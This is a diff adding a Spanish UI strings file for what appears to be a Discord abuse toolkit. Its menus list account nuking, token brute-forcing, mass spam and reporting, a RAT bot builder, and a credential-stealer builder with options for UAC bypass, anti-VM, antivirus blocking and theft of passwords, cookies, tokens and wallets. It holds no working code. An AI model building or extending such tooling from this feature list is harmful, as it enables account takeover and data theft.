@@ -1,0 +1,396 @@
+Información del Token{end_space4}
+Inicio de Sesión con Token
+Nuker de Tokens{end_space10}
+Recuperador de Tokens{end_space4}
+Desactivador de Tokens{end_space3}
+Fuerza Bruta de Tokens{end_space3}
+Escritor Falso{end_space11}
+Francotirador de Vanity{end_space2}
+Spammer de Grupo de Chat{end_space1}
+Bloqueador de Amigos{end_space5}
+Remover Amigos{end_space16}
+Eliminar solicitudes{end_space5}
+Crear Nuevos Servidores{end_space2}
+Cambiador de Perfil{end_space6}
+Recuperador de Códigos QR
+Bot de Discord Rata{end_space6}
+Pulsador de Botones{end_space6}
+Reactor de Mensajes{end_space6}
+Mensaje Directo Masivo{end_space3}
+Reporte Masivo{end_space11}
+Amigo Masivo{end_space13}
+Borrador de DMs{end_space10}
+Limpia DMs{end_space15}
+Saltar Reglas{end_space12}
+Saltar RestoreCord{end_space7}
+Saltar Sledge Hammer{end_space5}
+Herramienta de Webhook{end_space3}
+Por Plingenn{end_space13}
+Hist. de Cambios{end_space9}
+Configuraciones{end_space10}
+{space}Chat
+Manejar Tokens
+Pág. Sig.{end_space2}
+Ejecutándose en:{end_space10}
+Opción no válida, por favor inténtelo de nuevo.
+Interrumpido por el usuario.
+Cambiador de Tema
+Configuraciones de Cuenta
+Configuraciones de Proxy
+Configuraciones de Apariencia
+Alternar Modo de Depuración
+Panel de Administración
+Configuración Inválida
+CIAN
+AZUL
+VERDE
+ROJO
+BLANCO
+AMARILLO
+MAGENTA
+ROJO CLARO
+AZUL CLARO
+VERDE CLARO
+CIAN CLARO
+NEGRO CLARO
+Tema establecido en
+Resumen de la Cuenta
+Mi Licencia
+Historial de Compras
+Canjear Código
+Descargar Software
+Nombre de Usuario
+Creado el
+Cambiar Nombre de Usuario
+Cerrar Sesión
+Fallo al cambiar el nombre de usuario. El nombre de usuario debe contener al menos 3 caracteres.
+¿Quieres cerrar sesión de tu cuenta? (Y/N)
+Producto
+Expira en
+Fecha
+Ingresa tu código de producto para obtener tu contenido.
+Código
+Ya has canjeado el código.
+¡Asegúrate de guardar tu producto antes de presionar Enter!
+Clave no encontrada en la respuesta
+No se pudo recuperar los datos para el código proporcionado
+URL no encontrada en la información del código
+¡Código inválido!
+Alternar Uso de Proxy
+Limpiar Caché de Proxy
+Agregar Proxies Propios al Caché
+Raspar Proxy
+Elección Inválida
+Modo de Depuración Desactivado
+Modo de Depuración Activado
+Se agregó un nuevo Sistema de Autenticación
+Se mejoró el sistema de configuración
+Se rediseñó la interfaz del panel
+Se agregó un sistema de chat
+Se agregaron nuevas configuraciones de cuenta
+Se implementó el almacenamiento en caché para un mejor rendimiento
+RPC Personalizado de Discord
+Alternar RPC de Discord
+Alternar RPC Personalizado de Discord
+Editar RPC Personalizado de Discord
+RPC Personalizado de Discord Desactivado
+RPC Personalizado de Discord Activado
+Detalles (Requerido)
+Los detalles deben tener al menos 3 caracteres de longitud.
+Estado (Requerido)
+El estado debe tener al menos 3 caracteres de longitud.
+URL de imagen grande (Opcional)
+Texto grande (Opcional)
+URL de imagen pequeña (Opcional)
+Texto pequeño (Opcional)
+¿Cuántos botones deseas tener?
+Ingrese etiqueta para el botón
+Ingrese URL para el botón
+Formato de URL inválido. Por favor ingrese una URL válida.
+Número de botones inválido. Por favor ingrese un número entre 0 y 2.
+RPC de Discord Desactivado
+RPC de Discord Activado
+Modo Normal
+Modo RestoreCord (bypass captcha)
+Verificador de Caché
+Comprobador Personalizado
+Verificador de Servidores
+Ingrese la ruta personalizada para cargar los tokens desde
+Chat Normal
+Chat de Soporte (No disponible)
+Chat Privado (No disponible)
+Búsqueda de Servidores{end_space3}
+Clonador de Servidores{end_space3}
+Destructor de Servidores{end_space1}
+Unidor de Tokens{end_space9}
+Abandonador de Tokens{end_space4}
+Spammer de Tokens{end_space8}
+Ataque Epiléptico{end_space8}
+Spammer de sonidos{end_space7}
+Unidor de Voz en Chat{end_space4}
+Cambiador de Imagen de Perfil
+Cambiador de Apodo Global
+Cambio de apodo{end_space13}
+Cambiador de HypeSquad{end_space3}
+Cambiador de Pronombres{end_space2}
+Cambiador de Idioma{end_space6}
+Cambiador de Estado{end_space6}
+Cambiador de Tema{end_space8}
+Cambiador de Biografía{end_space3}
+Generador de Cuentas{end_space5}
+Creador de VideoCrash{end_space4}
+Ciclador de Configuraciones{end_space2}
+Notas de Parche{end_space10}
+Telegrama{end_space16}
+Selfbot{end_space18}
+Github{end_space19}
+Acerca de{end_space16}
+Salir{end_space20}
+Página Anterior
+Nombres de Servidores
+Mensaje
+Cantidad de Hilos
+Se ha producido un error:
+No se encontraron tokens en la caché
+Desplegando Nuke de Lluvia
+Nuke de Lluvia Desplegado. . .
+Mensajería
+ID del Mensaje:
+Se envió un mensaje a todos los amigos disponibles.
+Salió del gremio:
+Eliminado el gremio:
+Se ha encontrado el siguiente error y se está ignorando:
+Eliminados/Salidos todos los gremios disponibles.
+Eliminando amigo:
+Amigo eliminado:
+Se han eliminado todos los amigos disponibles.
+Creando
+Creado
+Se han creado todos los servidores.
+¡Nuke de Lluvia Detonado con Éxito!
+Convertido con éxito en un Desierto de Reme
+Ingresa algo para continuar. . .
+Iniciando modo de ataque epiléptico (cambiando entre modos claro/oscuro)
+No hay suficientes amigos para continuar.
+Se produjo un error al procesar el token
+Spammer de Canales
+ID del Canal
+Salto de Reglas
+ID del Gremio
+Escritor Falso de Token
+Apodo Global
+Nombre de Apodo
+Apodo de Servidor
+Cambiador de Pronombres
+Pronombres Aleatorios (s/n)
+Pronombres
+DM Eliminado:
+No hay suficientes DM para continuar.
+Ciclo interrumpido
+Spammer de sonido
+Programa interrumpido por el usuario.
+Error al enviar señal con el token:
+Error al unirse a VC con el token:
+Uniendo VC con Tokens..
+Se ha actualizado la invitación correctamente, tu servidor ahora se puede acceder por
+Error al actualizar la URL personalizada. Código de estado:
+Código de la URL personalizada para cazar
+ID del Servidor al que aplicar la URL personalizada
+Retraso entre verificaciones (segundos)
+El Francotirador de Vanity ha iniciado. Presiona Ctrl+C para detener.
+Error:
+Spammer de Webhooks
+Eliminador de Webhooks
+Webhook
+Webhook eliminado exitosamente
+Administrador de Tokens
+Guardar Tokens
+Borrar Tokens
+Verificar Tokens y Solo Guardar los Válidos (s/n)
+Caché de Tokens Vaciado.
+Ingresa la ruta al archivo de texto que contiene los tokens
+No se encontraron tokens en el archivo de texto especificado
+Verificador de Tokens
+Error al obtener el nombre del servidor:
+Uniéndose
+Ataque de fuerza bruta de token de lluvia. PD: Esto podría tomar mucho tiempo para funcionar.
+Si tienes una suerte extrema y logras obtener el token de alguien, lo descubrirás almacenado dentro de 'brute-force.txt'.
+Siempre busca permiso explícito de la persona antes de llevar a cabo un ataque de fuerza bruta en su cuenta.
+ID de usuario inválido, por favor inténtalo de nuevo!
+VÁLIDO
+INVÁLIDO
+Error al obtener fuentes de facturación:
+Error al obtener datos de Nitro:
+No hay información de facturación disponible.
+Recopilando información del usuario y controladores web...
+Nombre del Archivo
+Contraseña del Archivo
+¿Quieres proporcionar un archivo de icono? (s/n)
+Ruta de icono inválida o URL. Estableciendo el icono como Nulo.
+Ping Me (s/n)
+Anti VM (s/n)
+Iniciar con el Sistema (s/n)
+Bypass de UAC (s/n)
+Derretir (s/n)
+Ocultar Consola (s/n)
+Capturar Webcam (s/n)
+Capturar Contraseñas (s/n)
+Capturar Cookies (s/n)
+Capturar Autocompletados (s/n)
+Capturar Historial (s/n)
+Capturar Tokens de Discord (s/n)
+Capturar Juegos (s/n)
+Capturar Contraseñas de Wifi (s/n)
+Capturar Información del Sistema (s/n)
+Capturar Captura de Pantalla (s/n)
+Capturar Telegram (s/n)
+Capturar Archivos Comunes (s/n)
+Capturar Carteras (s/n)
+Error Falso (s/n)
+Título del Error Falso
+Mensaje del Error Falso
+Bloquear Sitios Antivirus (s/n)
+Inyección de Discord (s/n)
+Icono de Archivo
+Creando {name}.exe, Esto tomará unos segundos. ¡Gracias por tu paciencia!
+El archivo está en 'output/grabberbuilder/{name}.exe'
+Se ha creado un chat grupal
+Limitado por tasa ({response.json()['retry_after']}ms)
+No hay suficientes amigos disponibles para una selección aleatoria
+¿Quieres elegir tú mismo los usuarios para hacer spam en el chat grupal o prefieres seleccionar al azar?
+Elige usuarios tú mismo
+Aleatorizar los usuarios
+Creando chats grupales
+IDs de usuario
+No ingresaste comas (,) el formato es id,id2,id3
+en cualquier momento para detener
+Bloqueado:
+Error al obtener las relaciones:
+No hay suficientes solicitudes de amistad para continuar.
+Solicitud de amistad entrante de:
+Solicitud de amistad eliminada de:
+Total de solicitudes de amistad eliminadas:
+Se produjo un error al crear {server_name}: {e}
+¿icono para los servidores sí/no?
+Nombres de servidores aleatorios
+Nombres de servidores personalizados
+Nombre de los servidores que se crearán
+Por favor ingresa la ubicación del icono
+No se pudo encontrar "{image}" en tu PC
+Estado Personalizado
+Biografía Personalizada
+Creando Archivo... {i}
+Escribiendo Archivo... {i}
+Nota: Este código no está en pleno funcionamiento en este momento, pero aún se puede ejecutar. Sin embargo, podrías encontrar errores o fallas.
+Ingresa el nombre que deseas darle al archivo final
+Ingresa el token del bot que usarás para ejecutar los comandos RAT
+Token del Bot
+Ingresa el ID del gremio en el que están registrados los comandos de barra
+Error al escribir el archivo: {e}
+El archivo se ha escrito correctamente en "output/{fileName}.py"
+¿Convertir tu script en un ejecutable? (s/n)
+Creando archivo...
+Limpiando archivos antiguos...
+El archivo ejecutable se ha generado correctamente
+Se ha producido un error HTTP: {e}
+ID de Mensaje
+Por favor selecciona el botón que quieres presionar
+{r}({LIGHTBLACK_EX}{i}{r}) Nombre: {LIGHTBLACK_EX}{button_label}{r} , ID Personalizado: {LIGHTBLACK_EX}{button_custom_id}
+Botón
+Solo se encontró un botón en el mensaje.
+Error al añadir la reacción {reaction} al mensaje {message_id}. Se ha alcanzado el máximo número de reacciones.
+Se ha alcanzado el máximo número de reacciones.
+Error al añadir la reacción {reaction} al mensaje {message_id}. Prohibido: {error_message}
+Objetos
+Caras
+Animales
+Símbolos
+No se encontraron emojis en la respuesta
+Error al obtener emojis desde la API
+Enlace de invitación
+Formato de enlace de invitación inválido.
+Se ha producido un error al enviar la solicitud
+Información de la Invitación:
+Información del Invitador:
+Información del Servidor:
+Canal
+Fecha de Expiración
+ID de Usuario
+Insignias
+No disponible
+Nombre
+ID de Servidor
+Descripción
+Banner
+URL del Banner
+URL del Banner (No disponible)
+URL de Vanity
+Nivel de Verificación
+Splash
+URL del Splash
+URL del Splash (No disponible)
+Características
+Ataque Epiléptico Iniciado. Presiona Ctrl+C para detener.
+Ataque Epiléptico interrumpido
+Ciclo de Idioma iniciado. Presiona Ctrl+C para detener.
+Token inválido.
+Presiona ENTER para continuar
+Herramienta de API de Discord | https://Rain.xyz | Hecho por Plingenn
+Configuraciones de Apariencia
+Configuraciones de Texto
+Configuraciones de Cursor
+Configuraciones de Transparencia
+Configuraciones de Ventana
+Configuraciones de Idioma
+Esquema de Color
+Tipo de Fuente
+Tamaño de Fuente
+Altura de Línea
+Peso de la Fuente
+Efectos de Terminal Retro
+Configuraciones de Color
+Configuraciones de Fuente
+Configuraciones de Tamaño de Fuente
+Configuraciones de Altura de Línea
+Configuraciones de Peso de Fuente
+Configuraciones Retro
+Configuraciones de Cursor
+Idioma establecido en {chosen_language}
+Sin Nombre
+Tipo
+Casa
+Enlace del Mensaje
+Enlace de mensaje inválido
+Volviendo Atrás...
+Error al conectar con Discord RPC: {e}
+Elección
+Tema
+Configuración
+Editar
+Idioma
+Opacidad del Panel
+Opacidad inválida
+Configuraciones de Ventana
+Esta opción está en proceso
+Esta opción actualmente no está disponible. Por favor, ten paciencia, ya que se agregará más tarde.
+Esta opción actualmente no está disponible.
+Será reemplazado en una de las próximas actualizaciones con: '{replacement}'.
+Esta Opción No Está Disponible
+Estas opciones actualmente están en desarrollo
+Estas opciones están actualmente en desarrollo pero siguen siendo utilizables. Sin embargo, es probable que ocurran errores.
+Error al obtener pronombres desde {pronounce_url} ({statuscode})
+El uso de proxy no está disponible actualmente. Lamentamos cualquier inconveniente. Estará disponible en una de nuestras próximas actualizaciones.
+Uso de Proxy Activado {RED}APAGADO
+Uso de Proxy Activado {GREEN}ENCENDIDO
+Nuevos proxies escritos con éxito
+Proxies extraídos con éxito
+¡Hecho! {proxies} proxies extraídos en total => {temp} | {execution_time}ms
+PC{end_space6}
+Implementado soporte multilingüe.
+Hilo Masivo{end_space14}
+Spammer de Foro
+Mensaje Masivo de Usuario
+No Aplicable{end_space13}
+Impulsor de Servidor{end_space10}
+Usuario Activo con Token{end_space1}
+Creador de Encuestas{end_space5}
